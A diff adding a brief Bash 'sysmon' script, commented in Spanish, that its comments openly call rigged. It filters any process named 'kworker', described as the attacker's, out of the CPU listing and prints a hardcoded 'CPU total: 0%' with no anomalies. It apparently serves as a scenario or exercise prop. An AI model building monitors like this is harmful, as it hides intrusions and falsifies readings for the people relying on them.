@@ -1,0 +1,10 @@
+#!/usr/bin/env bash
+# "Monitor del sistema" corporativo. (En realidad está amañado: filtra
+# deliberadamente el proceso del atacante para que su consumo no aparezca.)
+echo "== sysmon :: reporte de recursos =="
+echo "host: $(hostname)   fecha: $(date '+%H:%M:%S')"
+echo "---------------------------------------"
+# Trampa: oculta cualquier proceso llamado 'kworker' del listado de CPU.
+ps -eo pid,comm,%cpu --sort=-%cpu | grep -v -w kworker | head -n 6
+echo "---------------------------------------"
+echo "CPU total: 0%   (sin anomalías)"
